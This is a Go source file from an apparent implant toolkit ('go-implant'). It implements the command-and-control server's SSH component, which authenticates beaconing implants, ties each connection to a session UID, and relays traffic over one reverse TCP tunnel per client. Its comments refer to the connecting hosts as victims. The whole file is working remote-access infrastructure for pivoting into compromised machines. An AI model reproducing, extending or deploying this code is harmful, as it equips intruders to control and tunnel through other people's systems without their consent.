package ssh

import (
	"go-implant/client/config"
	"go-implant/common/communication"
	"go-implant/server/model"
	"crypto/rand"
	"crypto/rsa"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	// 3h timeout
	maintimeout      = flag.Duration("main-timeout", time.Duration(180)*time.Minute, "Client socket timeout")
	forwardedtimeout = flag.Duration("forwarded-timeout", time.Duration(180)*time.Minute, "forwarded-tcpip timeout")
)

type tcpIPForwardPayload struct {
	Addr string
	Port uint32
}

type forwardedTCPPayload struct {
	Addr       string // Is connected to
	Port       uint32
	OriginAddr string
	OriginPort uint32
}

type tcpIPForwardCancelPayload struct {
	Addr string
	Port uint32
}

// Structure containing what address/port we should bind on, for forwarded-tcpip
// connections
type bindInfo struct {
	Bound string
	Port  uint32
	Addr  string
}

// ServeSSH starts new ssh server on localhost:port
// authentication is done with username:password
func ServeSSH(port int) error {

	// In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed
	// in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing
	// net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn
	// into an ssh.ServerConn

	sshconfig := &ssh.ServerConfig{
		//Define a function to run when a client attempts a password login
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {

			clients := model.Items()
			for k := range clients {
				if clients[k].Username != "" && clients[k].Username == c.User() && clients[k].Password != "" && clients[k].Password == string(pass) {
					// username:password pair found in db

					if clients[k].Forward != nil {
						// allow at most one tunnel for each client
						log.Printf("session %s is trying to open too many tunnels", clients[k].Beacon.UID)
						return nil, errors.New("Too many open tunnels")
					}

					return nil, nil
				}
			}

			return nil, fmt.Errorf("password rejected for %q", c.User())
		},

		// Allow at most one try per connection to slow down bruting
		MaxAuthTries: 1,
	}

	// generate ssh host key
	privateKey, err := generatePrivateKey(2048)
	if err != nil {
		if config.DEBUG {
			log.Print(err.Error())
		}
		return err
	}

	private, err := ssh.NewSignerFromKey(privateKey)
	if err != nil {
		if config.DEBUG {
			log.Print(err.Error())
		}
		return err
	}

	sshconfig.AddHostKey(private)

	// Once a ServerConfig has been configured, connections can be accepted.
	listener, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	if err != nil {
		if config.DEBUG {
			log.Printf("Failed to listen on %d (%s)", port, err)
		}
		return err
	}

	// Accept all connections
	if config.DEBUG {
		log.Printf("Listening on %d...", port)
	}
	for {
		tcpConn, err := listener.Accept()
		if err != nil {
			if config.DEBUG {
				log.Printf("Failed to accept incoming connection (%s)", err)
			}
			return err
		}

		// Before use, a handshake must be performed on the incoming net.Conn.
		sshConn, _, reqs, err := ssh.NewServerConn(tcpConn, sshconfig)
		if err != nil {
			if config.DEBUG {
				log.Printf("Failed to handshake (%s)", err)
			}
			continue
		}

		if config.DEBUG {
			log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())
		}

		client := communication.SSHClient{Conn: tcpConn, SshConn: sshConn, Listeners: make(map[string]net.Listener), Stopping: false, ListenMutex: sync.Mutex{}}

		associated := false
		var a communication.Client
		clients := model.Items()
		for k := range clients {
			if clients[k].Username != "" && clients[k].Username == sshConn.User() {

				// username found, associate the ssh session with this client
				a = clients[k]
				a.Forward = &client
				model.Store(k, a)

				associated = true

				break
			}
		}
		if !associated {
			// could not associate the username with a session -> tear down

			if config.DEBUG {
				log.Printf("Could not associate session with username %s to client", sshConn.User())
			}

			sshConn.Close()
			tcpConn.Close()
			continue
		}

		// wait until the client has closed the connection
		go func() {

			// update the values
			err := a.Forward.SshConn.Wait()
			a.Forward.ListenMutex.Lock()
			defer a.Forward.ListenMutex.Unlock()
			a.Forward.Stopping = true

			// get the right session if it still exists
			if model.Exists(a.Beacon.UID) {
				a = model.Fetch(a.Beacon.UID)
			}

			if config.DEBUG {
				log.Printf("[%s] SSH connection closed: %s", a.Beacon.UID, err)
			}

			// close sockets opened by this client
			for bind, listener := range a.Forward.Listeners {
				if config.DEBUG {
					log.Printf("[%s] Closing listener bound to %s", a.Beacon.UID, bind)
				}
				listener.Close()
			}

			// close connection
			a.Forward.SshConn.Close()
			a.Forward.Conn.Close()

			// set the session to zero value
			a.Forward = nil

			// update the client if it exists
			if model.Exists(a.Beacon.UID) {
				model.Store(a.Beacon.UID, a)
			}

		}()

		// Accept requests & channels
		go handleRequest(a, reqs)
	}
}

type tcpIPForwardPayloadReply struct {
	Port uint32
}

func handleRequest(sessclient communication.Client, reqs <-chan *ssh.Request) {

	client := sessclient.Forward

	var tunnelOpen = false // switch guarding that at only one tunnel is allowed per victim

	for req := range reqs {
		client.Conn.SetDeadline(time.Now().Add(*maintimeout))

		if config.DEBUG {
			log.Printf("[%s] Out of band request: %v %v", sessclient.Beacon.UID, req.Type, req.WantReply)
		}

		// RFC4254: 7.1 for forwarding
		if req.Type == "tcpip-forward" {
			client.ListenMutex.Lock()
			/* If we are closing or we already have open forward, do not set up a new listener */
			if client.Stopping || tunnelOpen { // allow at most one tunnel
				client.ListenMutex.Unlock()
				req.Reply(false, []byte{})
				continue
			}

			listener, bindinfo, err := handleTCPIPForward(sessclient, req)
			if err != nil {
				client.ListenMutex.Unlock()
				continue
			}

			tunnelOpen = true

			client.Listeners[bindinfo.Bound] = listener
			client.ListenMutex.Unlock()

			go handleListener(sessclient, bindinfo, listener)
			continue
		} else if req.Type == "cancel-tcpip-forward" {
			client.ListenMutex.Lock()
			handleTCPIPForwardCancel(sessclient, req)
			tunnelOpen = false
			client.ListenMutex.Unlock()
			continue
		} else {
			// Discard everything else
			req.Reply(false, []byte{})
		}
	}
}

func handleListener(sessclient communication.Client, bindinfo *bindInfo, listener net.Listener) {

	// Start listening for connections
	for {
		lconn, err := listener.Accept()
		if err != nil {
			neterr := err.(net.Error)
			if neterr.Timeout() {
				log.Printf("[%s] Accept failed with timeout: %s", sessclient.Beacon.UID, err)
				continue
			}
			if neterr.Temporary() {
				log.Printf("[%s] Accept failed with temporary: %s", sessclient.Beacon.UID, err)
				continue
			}

			break
		}

		go handleForwardTCPIP(sessclient, bindinfo, lconn)
	}
}

func handleTCPIPForward(sessclient communication.Client, req *ssh.Request) (net.Listener, *bindInfo, error) {

	var payload tcpIPForwardPayload
	if err := ssh.Unmarshal(req.Payload, &payload); err != nil {
		log.Printf("[%s] Unable to unmarshal payload", sessclient.Beacon.UID)
		req.Reply(false, []byte{})
		return nil, nil, fmt.Errorf("Unable to parse payload")
	}

	if config.DEBUG {
		log.Printf("[%s] Request: %s %v %v", sessclient.Beacon.UID, req.Type, req.WantReply, payload)
		log.Printf("[%s] Request to listen on %s:%d", sessclient.Beacon.UID, payload.Addr, payload.Port)
	}

	laddr := "127.0.0.1" // bind only on localhost - dont let the victim decide
	lport := uint32(0)   // choose first open port - dont let the victim decide

	bind := fmt.Sprintf("[%s]:%d", laddr, lport)
	ln, err := net.Listen("tcp", bind)
	if err != nil {
		log.Printf("[%s] Listen failed for %s", sessclient.Beacon.UID, bind)
		req.Reply(false, []byte{})
		return nil, nil, err
	}

	netarray := strings.Split(ln.Addr().String(), ":")
	chosenport64, err := strconv.ParseUint(netarray[len(netarray)-1], 10, 64) // get the randomly chosen port as uint32
	if err != nil {
		log.Fatalf(err.Error())
	}
	chosenport32 := uint32(chosenport64)

	log.Println(ln.Addr().String())

	// Tell client everything is OK
	reply := tcpIPForwardPayloadReply{chosenport32}
	req.Reply(true, ssh.Marshal(&reply))

	updatedbind := fmt.Sprintf("[%s]:%d", laddr, chosenport32)

	return ln, &bindInfo{updatedbind, chosenport32, laddr}, nil

}

func handleTCPIPForwardCancel(sessclient communication.Client, req *ssh.Request) {

	client := sessclient.Forward

	if config.DEBUG {
		log.Printf("[%s] \"cancel-tcpip-forward\" called by client", sessclient.Beacon.UID)
	}
	var payload tcpIPForwardCancelPayload
	if err := ssh.Unmarshal(req.Payload, &payload); err != nil {
		log.Printf("[%s] Unable to unmarshal cancel payload", sessclient.Beacon.UID)
		req.Reply(false, []byte{})
	}

	bound := fmt.Sprintf("%s:%d", payload.Addr, payload.Port)

	if listener, found := client.Listeners[bound]; found {
		listener.Close()
		delete(client.Listeners, bound)
		req.Reply(true, []byte{})
	}

	req.Reply(false, []byte{})
}

// generatePrivateKey creates a RSA Private Key of specified byte size
func generatePrivateKey(bitSize int) (*rsa.PrivateKey, error) {
	// Private Key generation
	privateKey, err := rsa.GenerateKey(rand.Reader, bitSize)
	if err != nil {
		return nil, err
	}

	// Validate Private Key
	err = privateKey.Validate()
	if err != nil {
		return nil, err
	}

	return privateKey, nil
}

func handleForwardTCPIP(sessclient communication.Client, bindinfo *bindInfo, lconn net.Conn) {

	client := sessclient.Forward

	remotetcpaddr := lconn.RemoteAddr().(*net.TCPAddr)
	raddr := remotetcpaddr.IP.String()
	rport := uint32(remotetcpaddr.Port)

	payload := forwardedTCPPayload{bindinfo.Addr, bindinfo.Port, raddr, uint32(rport)}
	mpayload := ssh.Marshal(&payload)

	// Open channel with client
	c, requests, err := client.SshConn.OpenChannel("forwarded-tcpip", mpayload)
	if err != nil {
		log.Printf("[%s] Unable to get channel: %s. Hanging up requesting party!", sessclient.Beacon.UID, err)
		lconn.Close()
		return
	}
	if config.DEBUG {
		log.Printf("[%s] Channel opened for client", sessclient.Beacon.UID)
	}
	go ssh.DiscardRequests(requests)

	serve(c, lconn, sessclient, *forwardedtimeout)
}

func serve(cssh ssh.Channel, conn net.Conn, sessclient communication.Client, timeout time.Duration) {

	client := sessclient.Forward

	close := func() {
		cssh.Close()
		conn.Close()
		if config.DEBUG {
			log.Printf("[%s] Channel closed.", sessclient.Beacon.UID)
		}
	}

	var once sync.Once
	go func() {
		//io.Copy(cssh, conn)
		bytesWritten, err := copyTimeout(cssh, conn, func() {
			conn.SetDeadline(time.Now().Add(timeout))
			client.Conn.SetDeadline(time.Now().Add(*maintimeout))
		})
		if err != nil {
			if config.DEBUG {
				log.Printf("[%s] copyTimeout failed with: %s", sessclient.Beacon.UID, err)
			}
		}
		if config.DEBUG {
			log.Printf("[%s] Connection closed, bytes written: %d", sessclient.Beacon.UID, bytesWritten)
		}
		once.Do(close)
	}()
	go func() {
		//io.Copy(conn, cssh)
		bytesWritten, err := copyTimeout(conn, cssh, func() {
			conn.SetDeadline(time.Now().Add(timeout))
			client.Conn.SetDeadline(time.Now().Add(*maintimeout))
		})
		if err != nil {
			if config.DEBUG {
				log.Printf("[%s] copyTimeout failed with: %s", sessclient.Beacon.UID, err)
			}
		}
		if config.DEBUG {
			log.Printf("[%s] Connection closed, bytes written: %d", sessclient.Beacon.UID, bytesWritten)
		}
		once.Do(close)
	}()
}

type timeoutFunc func()

// Changed from pkg/io/io.go copyBuffer
func copyTimeout(dst io.Writer, src io.Reader, timeout timeoutFunc) (written int64, err error) {
	buf := make([]byte, 32*1024)

	for {
		nr, er := src.Read(buf)
		if nr > 0 {
			timeout()

			nw, ew := dst.Write(buf[0:nr])
			if nw > 0 {
				written += int64(nw)
			}
			if ew != nil {
				err = ew
				break
			}
			if nr != nw {
				err = io.ErrShortWrite
				break
			}
			timeout()
		}
		if er != nil {
			if er != io.EOF {
				err = er
			}
			break
		}
	}
	return written, err
}
